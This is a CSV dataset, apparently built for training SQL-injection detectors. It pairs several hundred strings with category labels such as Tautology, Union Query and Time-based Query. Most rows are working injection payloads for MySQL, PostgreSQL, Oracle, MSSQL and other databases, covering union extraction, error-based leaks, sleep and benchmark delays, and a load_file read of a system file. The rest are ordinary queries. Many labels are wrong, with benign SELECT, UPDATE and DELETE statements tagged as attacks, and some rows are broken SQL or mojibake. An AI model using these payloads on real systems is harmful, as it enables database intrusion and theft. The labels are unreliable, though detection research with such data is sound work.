knownpatterns,category
1'  )   as yxdb where 4597  =  4597,Tautology
"""-2748'   )    )    as gazw where 4624  =  4624 union all select 4624,4624#""",Union Query
SELECT tool FROM coffee,Tautology
-4104%' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   \::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and '%'  =  ',Tautology
"""INSERT INTO automobile  ( soldier, best, clean )  VALUES  ( 'struck', 'program', 'greatly' )  """,Alternate Encoding
"""1%'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  '%'  =  '""",Union Query
SELECT total ( s )  FROM upper SELECT high FROM which,Tautology
"""  SELECT peace AS belt, today AS [leather]  FROM begun""",Tautology
SELECT * FROM biggest,Tautology
"""   SELECT bow, ago, tears FROM neighbor WHERE locate  IS NULL""",Tautology
SELECT length ( s ) FROM anyone INNER JOIN,Tautology
SELECT * FROM using 3,Tautology
""" SELECT SUBSTRING ( CustomerName, 2, 5 )  AS ExtractString FROM Customers;""",Illegal/Logically incorrect query
"""  SELECT twoID AS ID, fell AS wherever FROM party""",Tautology
SELECT MIN ( damage )  AS won FROM sea,Illegal/Logically incorrect query
"""1""""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  """"mmgx"""" like """"mmgx""",Tautology
SELECT COUNT ( those )  FROM mission,Illegal/Logically incorrect query
SELECT DISTINCT mouth FROM cloud,Tautology
""" SELECT * FROM mostly ORDER BY useful ASC, arrive DESC""",Tautology
SELECT week ( s )  FROM outside SELECT pot FROM during,Tautology
"""1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null  )   and 'bpbe' like 'bpbe""",Illegal/Logically incorrect query
"""1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  """,Illegal/Logically incorrect query
"""SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 173 )  ORDER BY meta_id ASC""",Tautology
 AND 7506=9091 AND ('5913=5913,Tautology
SELECT * FROM bridge,Tautology
-4215  )   where 5782  =  5782 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,Alternate Encoding
SELECT * FROM likely WHERE equally = 'is',Tautology
SELECT fence FROM coal,Tautology
"""1""""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190   )    )     )  x717a767a71x78   )    )   x   )    )    and   (  """"wfwg"""" like """"wfwg""",Alternate Encoding
"""-5513""""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   \::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  """"ovmk"""" like """"ovmk""",Tautology
1   )    )    as emtf where 3561=  3561 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,Time-based Query
"""1'  )   where 8948  =  8948 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --""",Illegal/Logically incorrect query
"""1"""" union all select null--""",Union Query
or 'whatever' in ('whatever'),Tautology
"""1'   )    )     )   or 8421=    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'bmzj' like 'bmzj""",Illegal/Logically incorrect query
"""1'   )    )    and updatexml  (  3393,concat  (  0x2ex7171706a71,  (  select   (  elt  (  3393  =  3393   )    )     )  x717a767a71  )  161  )   and    (    (   'vedm'  =  'vedm""",Alternate Encoding
SELECT * FROM hill WHERE    NOT beyond = 'great',Tautology
"""1""""  )   where 6065  =  6065 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --""",Illegal/Logically incorrect query
"""select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'quqx'  =  'quqx""",Tautology
"""1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  """,Illegal/Logically incorrect query
-4518 where 8023  =  8023 or 6872  =  6872--,Tautology
" UNION ALL SELECT 'INJ'||'ECT'||'XXX',2",Union Query
""" select * from users where id=1 or """".{"""" or 1=1-- 1""""",Tautology
"""  SELECT creature AS mighty, adult AS [serious]  FROM hair""",Tautology
"""- 1525'   )    )     )   union all select 4110,4110,4110,4110,4110,4110#""",Union Query
1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,Time-based Query
"benchmark(50000000,MD5(1))--",Tautology
SELECT * FROM matter WHERE begun = 'age',Tautology
HAVING 1=0--,Inference
"""1%' and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --""",Illegal/Logically incorrect query
-4882' order by 1#,Tautology
 or sleep  (  __TIME__  )  #,Time-based Query
"""waitfor delay '0:0:5' and   (  """"%""""  =  """"""",Time-based Query
SELECT listen ( s )  FROM courage SELECT eaten FROM his,Tautology
SELECT City FROM Suppliers  ORDER BY City;,Tautology
"""1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )    )  """,Stored Procedure
select pg_sleep  (  5  )   and   (  1044=1044,Time-based Query
"""1'  )   where 6774  =  6774 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --""",Illegal/Logically incorrect query
SELECT TOP 50 PERCENT * FROM obtain SELECT * FROM section FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM basket,Tautology
"""  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  """"avyw""""  =  """"avyw""",Time-based Query
SELECT * FROM slightly WHERE mixture = 'she' LIMIT 3,Tautology
SELECT * FROM jump WHERE garden BETWEEN third09/01/1996boat AND east15/31/1996plan,Tautology
SELECT * FROM hole WHERE blank = 'herself'  OR softly = 'ring',Tautology
"""1""""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#""",Union Query
""" select * from users where id=1 + $+%1 union select null,@@VERSION -- 1""",Union Query
"""-8301'  )   union all select 1806806--""",Union Query
SELECT * FROM brain FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM shadow,Tautology
SELECT * FROM standard FETCH FIRST 50 PERCENT ROWS ONLY,Tautology
SELECT * FROM certain WHERE trouble = 'thou',Tautology
"""   SELECT lady, crack, discovery FROM grade WHERE captured  IS NULL""",Tautology
SELECT Count ( * )  AS column,Illegal/Logically incorrect query
 ORDER BY 16 ,Tautology
"""SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 11451 )  ORDER BY meta_id ASC""",Tautology
"""-5700 where 4238  =  4238 union all select 4238,4238,4238#""",Union Query
1' where 1593=1593,Tautology
SELECT * FROM advice WHERE question BETWEEN '1996-07-01' AND '1996-07-31',Tautology
"""-9227  )   where 6723  =  6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--""",Union Query
"""  SELECT * FROM Customers   WHERE Country IN  ( 'Germany', 'France', 'UK' ) ; """,Illegal/Logically incorrect query
SELECT AVG ( Price ) FROM day,Illegal/Logically incorrect query
SELECT * FROM clear WHERE exciting NOT LIKE '[slept]%',Tautology
"""-9119""""  )   where 9237  =  9237 or 8571=  8571--""",Tautology
1' where 2958  =  2958,Tautology
"""1   )    )    or 4411=    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   3003  =  3003""",Illegal/Logically incorrect query
"""1'   )    )    as qcgf where 9656  =  9656 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --""",Illegal/Logically incorrect query
"""   SELECT bare,directly,brave,younger,stay     (  (  seed JOIN teacher ON ordinary.death =  everyone.consist )   INNER JOIN cleanON Orders.old =  stepped.fenceID ) """,Tautology
"""1%"""" union all select null,null,null,null,null,null#""",Union Query
"""1'  )   where 7391=  7391 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --""",Illegal/Logically incorrect query
"""1""""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190   )    )     )  x717a767a71x78   )    )   x   )    )    and    (    (     (  """"sdvu"""" like """"sdvu""",Alternate Encoding
SELECT MIN ( hot )  AS sum FROM shoe,Illegal/Logically incorrect query
SELECT nation ( s ) FROM spend INNER JOIN,Tautology
SELECT though ( s )  FROM opposite SELECT sure FROM younger,Tautology
"select * from users where id=1 +$ . or 1=1-- 1""",Tautology
1'||  (  select 'ilkr' from dual where 9296  =  9296,Tautology
SELECT * FROM  ( SELECT proper FROM becoming ) ,Illegal/Logically incorrect query
"""1   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  6312  =  6312""",Tautology
"""-5728  )   where 8663  =  8663 union all select 8663,8663,8663,8663,8663,8663,8663,8663,8663,8663#""",Union Query
"""1""""  )   where 2016  =  2016 and   (  1547  =  2093  )  *2093--""",Tautology
"""1""""   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045=1045   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   """"aall"""" like """"aall""",Union Query
"""1   )    )    as zmsa where 6909  =  6909 union all select null,null,null,null,null,null,null#""",Union Query
"select * from users where id=1 + $+%\ or 1=1-- 1""",Tautology
"""1,row  (  7937,5067  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  7937  =  7937   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 9974 union select 5497 union select 8209 union select 8147  )  a group by x  )  """,Union Query
"""  SELECT Orders.probablyrID, Employees.place, Employees.there FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.rodID ORDER BY Orders.physicalID""",Tautology
" AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))",Union Query
"""1%'  )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null  )   and   (  '%'  =  '""",Illegal/Logically incorrect query
SELECT * FROM general WHERE half = 'log' FETCH FIRST 3 ROWS ONLY,Tautology
1   )    )    as rvex where 3462  =  3462 and 4595  =  4595#,Tautology
-2374  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  2576  =  2576,Alternate Encoding
SELECT * FROM specific  WHERE explore NOT LIKE '[cool]%',Tautology
SELECT MIN ( cent )  AS just FROM just,Illegal/Logically incorrect query
SELECT Count ( * )  AS doctor,Illegal/Logically incorrect query
SELECT AVG ( dull ) FROM view SELECT SUM ( unhappy ) ,Illegal/Logically incorrect query
SELECT drive ( s FROM laid RIGHT JOIN,Tautology
SELECT * FROM past WHERE correctly = 'remarkable' LIMIT 3,Tautology
"""-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#""",Union Query
"""1%'  )   union all select null,null,null,null,null,null,null,null,null,null--""",Union Query
SELECT TOP 50 PERCENT * FROM furniture SELECT * FROM change FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM then,Tautology
"""1""""  )   as hfvz where 7186  =  7186 union all select null,null,null,null,null,null#""",Union Query
select case when 5433  =  6458 then 1 else null end--,Tautology
"""select * from generate_series  (  4975,4975,case when   (  4975  =  9615  )   then 1 else 0 end  )   limit 1--""",Tautology
SELECT * FROM account WHERE horn BETWEEN exciting09/01/1996frighten AND agree15/31/1996scientist,Illegal/Logically incorrect query
"""   SELECT COUNT ( negative ) , mad FROM bend BY story""",Illegal/Logically incorrect query
"""  SELECT * FROM tail WHERE wet IN  ( 'court', 'birth', 'image' )  """,Tautology
"""-9505'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qhdg'  =  'qhdg""",Tautology
DELETE FROM fully WHERE memory = 'wonderful',Tautology
SLEEP(5)#,Time-based Query
1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like 'uzhd,Time-based Query
%' AND 8310=8311 AND '%'=',Tautology
1'  )   as gxfu where 9676  =  9676,Tautology
select   (  case when   (  9556  =  7122  )   then 9556 else 9556*  (  select 9556 from information_schema.character_sets  )   end  )  #,Alternate Encoding
1'+  (  select yjyp where 9696  =  9696,Tautology
SELECT * FROM children WHERE use IN  ( SELECT blanket FROM aside ) ,Tautology
SELECT chance ( s )  FROM in SELECT worker ( s ) ,Tautology
SELECT AVG ( Price ) FROM applied,Illegal/Logically incorrect query
"""call regexp_substring  (  repeat  (  right  (  char  (  3702  )    )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '""",Illegal/Logically incorrect query
SELECT * FROM family WHERE national = 'note'  OR her = 'burn',Tautology
SELECT TOP 50 PERCENT * FROM cold SELECT * FROM particular FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM express,Tautology
"""1'||  (  select 'jbgg' from dual where 1986=1986 union all select null,null,null,null,null,null,null,null,null,null#""",Union Query
"""select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  '%'  =  '""",Illegal/Logically incorrect query
 or userid like '%,Tautology
"""1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'iari'  =  'iari""",Tautology
"""1%""""  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  """"%""""  =  """"""",Time-based Query
""" select * from users where id=1 + @`\` union select 1,version  (    )   -- 1""",Union Query
1 where 8532  =  8532,Tautology
"""1""""   )    )    union all select null,null,null,null,null,null,null,null--""",Union Query
select pg_sleep  (  5  )   and    (    (     (  'mgbm' like 'mgbm,Time-based Query
"""1""""   )    )    as xxdm where 4818  =  4818""",Tautology
"""1""""   )    )    as eglv where 7412  =  7412 union all select null#""",Union Query
SELECT * FROM pretty,Tautology
"""-4005' where 3963  =  3963 or elt  (  1032=1032,3623  )  --""",Tautology
 UPDATE deeply SET dance = 'trace'WHERE truth = 'bar',Tautology
"""1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --""",Illegal/Logically incorrect query
1%'   )    )    and 3721=  2597#,Tautology
-7962'   )    )    as pgqz where 6058  =  6058 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,Tautology
SELECT * FROM we FETCH FIRST 3 ROWS ONLY,Tautology
""" select * from users where id=1 union select 1,banner from v$version where rownum=1-- 1""""",Union Query
SELECT ASIN ( -0.8 ) ;,Tautology
/*â€¦*/ ,Tautology
"""-8793' where 3853  =  3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#""",Union Query
-9331' or   (  4519  =  2912  )  *2912 and 'rddk'  =  'rddk,Tautology
SELECT region ( s ) FROM aware INNER JOIN,Tautology
select   (  case when   (  5203  =  6330  )   then 5203 else 5203*  (  select 5203 from mysql.db  )   end  )  #,Tautology
""" SELECT Employees.LastName, COUNT ( Orders.OrderID )  AS NumberOfOrders FROM Orders INNER JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID WHERE LastName  =  'Davolio' OR LastName  =  'Fuller' GROUP BY LastName HAVING  COUNT ( Orders.OrderID )  > 25;""",Illegal/Logically incorrect query
SELECT * FROM protection WHERE    NOT everybody = 'able',Tautology
SELECT religious FROM wish UNION ALL SELECT constantly FROM blood ORDER BY slope,Union Query
SELECT COUNT ( afraidID ) FROM paragraph,Illegal/Logically incorrect query
/*SELECT * FROM Customers;,Tautology
"""1'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --""",Illegal/Logically incorrect query
"""   SELECT Employees.nails, COUNT ( Orders.paragraphID )  AS soapFROM    ( OrdersINNER JOIN sometime ON Orders.rulerID  =  Employees.danceID ) """,Illegal/Logically incorrect query
"""-4076'   )    )    union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--""",Union Query
SELECT sing ( s )  FROM deeply LEFT JOIN,Tautology
"""1""""  )   union all select null,null,null#""",Union Query
SELECT * FROM probably,Tautology
SELECT AVG ( walk )  FROM magnet  SELECT SUM ( silent ) ,Illegal/Logically incorrect query
SELECT * FROM compound WHERE little = 'itself' FETCH FIRST 3 ROWS ONLY,Tautology
"""1',  (  case when 5204  =  2136 then 1 else null end  )  """,Tautology
1'   )    )     )   and 6991=  5579,Tautology
"""1   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --""",Tautology
SELECT TOP 3 * FROM home,Tautology
SELECT * FROM machinery,Tautology
"""1'   )    )    as kxek where 3429  =  3429 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --""",Tautology
"""1%""""   )    )     )  """,Tautology
SELECT AVG ( idea ) FROM fight,Illegal/Logically incorrect query
"""-2912""""  )   as eizh where 2223  =  2223 or make_set  (  1041=  3056,3056  )  --""",Tautology
"""SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262331 )  ORDER BY meta_id ASC""",Tautology
SELECT AVG ( sweet ) FROM tired SELECT SUM ( purple ) ,Illegal/Logically incorrect query
or '1'='1,Tautology
1'  )   or sleep  (  5  )   and   (  'kgbm'  =  'kgbm,Time-based Query
SELECT * FROM  ( SELECT natural FROM run ) ,Tautology
""" SELECT * FROM adult ORDER BY tool ASC, bound DESC""",Tautology
"""   SELECT cast, wealth+ ', ' + neighborhood+ ' ' + thousand+ ', ' + worried AS upper  FROM sharp""",Tautology
"""-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#""",Union Query
SELECT * FROM grandfather WHERE policeman = 'small',Tautology
"""-7714 where 9768  =  9768 union all select 9768,9768--""",Union Query
SELECT * FROM letter WHERE flight = 'underline'  AND  ( dance = 'basket' OR appearance = 'magnet' ) ,Tautology
SELECT * FROM separate,Tautology
-5299 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     ) ,Alternate Encoding
SELECT * FROM price WHERE choice LIKE '%wrapped%',Tautology
"""  UPDATE chart SET pleasant =  'diameter', City =  'post' WHERE get =  diagram""",Alternate Encoding
SELECT TOP 50 PERCENT * FROM wind,Tautology
SELECT keep FROM cow,Tautology
"""select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240""",Illegal/Logically incorrect query
SELECT * FROM only WHERE Price NOT BETWEEN 10 AND 20,Tautology
"1)) or benchmark(10000000,MD5(1))#",Tautology
SELECT * FROM character,Alternate Encoding
SELECT * FROM screen WHERE thin = 'noise'  OR anything = 'airplane',Tautology
SELECT * FROM short WHERE    NOT want = 'twelve',Tautology
SELECT * INTO newtable FROM oldtable WHERE 1=  0;,Alternate Encoding
SELECT * FROM promised WHERE shout BETWEEN black09/01/1996nearly AND jungle15/31/1996move,Tautology
"""  UPDATE laid SET fuel =  'birds', City =  'won' WHERE carbon =  percent""",Tautology
SELECT * FROM snow WHERE Price NOT BETWEEN 10 AND 20,Tautology
SELECT sea ( s )  FROM unusual,Tautology
SELECT COUNT ( DISTINCT judge )  FROM month,Illegal/Logically incorrect query
SELECT * FROM blow ORDER BY lady,Tautology
or%201=1,Tautology
SELECT * FROM announced WHERE bite LIKE '%well%',Tautology
"""select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and 'fgcg'  =  'fgcg""",Alternate Encoding
SELECT * FROM  ( SELECT writing FROM in ) ,Tautology
"""1   )    )    union all select null,null,null,null,null,null,null,null,null,null#""",Union Query
"""-3370' in boolean mode  )   union all select 3432,3432,3432,3432#""",Union Query
SELECT chart FROM empty,Alternate Encoding
"""1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  """,Illegal/Logically incorrect query
SELECT AVG ( Price ) FROM hide,Illegal/Logically incorrect query
"""-7296%'   )    )     )   union all select 9322,9322,9322,9322--""",Union Query
"""1%' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and '%'  =  '""",Tautology
SELECT paint ( s )  FROM saddle SELECT full ( s ) ,Alternate Encoding
"""1"""" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  """,Tautology
"""1   )    )    as wmxa where 6485  =  6485 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --""",Tautology
"""1' where 2025  =  2025 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --""",Illegal/Logically incorrect query
-2505' or 9323  =  9323#,Tautology
"1;(load_file(char(47,101,116,99,47,112,97,115, ...",Alternate Encoding
1'  )   as fksm where 9714  =  9714,Tautology
SELECT income FROM oxygen UNION SELECT therefore FROM courage ORDER BY stronger,Union Query
"""1%' and elt  (  3114  =  3114,sleep  (  5   )    )   #""",Time-based Query
SELECT equator,Tautology
SELECT MIN ( book )  AS noted FROM person,Illegal/Logically incorrect query
"""1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'lwrk' like 'lwrk""",Illegal/Logically incorrect query
"""1%""""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   """"%""""  =  """"""",Illegal/Logically incorrect query
SELECT option_value FROM wp_options WHERE option_name  =  'kc_options' LIMIT 1,Tautology
"""INSERT INTO aboard  ( smallest, large, somehow )  VALUES  ( 'ready', 'maybe', 'element' )  """,Alternate Encoding
"""1'+  (  select 'ixza' where 4374  =  4374 union all select null,null,null--""",Union Query
"""1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'phdn' like 'phdn""",Illegal/Logically incorrect query
SELECT * FROM needle WHERE fog IN  ( SELECT darkness FROM appearance ) ,Tautology
SELECT TOP 3 * FROM tax WHERE aboard = 'gulf' SELECT * FROM skin,Tautology
SELECT AVG ( balloon ) FROM pain SELECT SUM ( negative ) ,Illegal/Logically incorrect query
SELECT * FROM CustomersFETCH FIRST 50 PERCENT ROWS ONLY;,Tautology
"""-9098' union all select 3476,3476,3476,3476,3476,3476#""",Union Query
ORDER BY 2#,Tautology
1  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  3836  =  3836,Tautology
"""1   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --""",Illegal/Logically incorrect query
""" SELECT column_name ( s )  FROM wall,sides""",Tautology
SELECT TOP 3 * FROM theory WHERE friendly = 'he',Tautology
Ã¢Â€Â˜ or 1=1 --,Tautology
SELECT * FROM sound WHERE shot BETWEEN '1996-07-01' AND '1996-07-31',Tautology
SELECT * FROM busy WHERE took = 'buffalo',Tautology
"""   SELECT satellites, listen, bottomFROM threw WHERE mighty  IS NOT NULL""",Tautology
"""1'   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --""",Illegal/Logically incorrect query
%25%27,Tautology
Ã¢â‚¬â„¢ or Ã¢â‚¬Ëœ1Ã¢â‚¬â„¢  =  Ã¢â‚¬â„¢1,Tautology
"""1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null  )   and 'fjfo'  =  'fjfo""",Illegal/Logically incorrect query
SELECT * FROM tongue WHERE cook = 'idea' LIMIT 3,Tautology
"""-3505""""  )   where 2340  =  2340 or 9323  =  9323#""",Tautology
1   )    )    as myxo where 1759=1759 union all select null#,Union Query
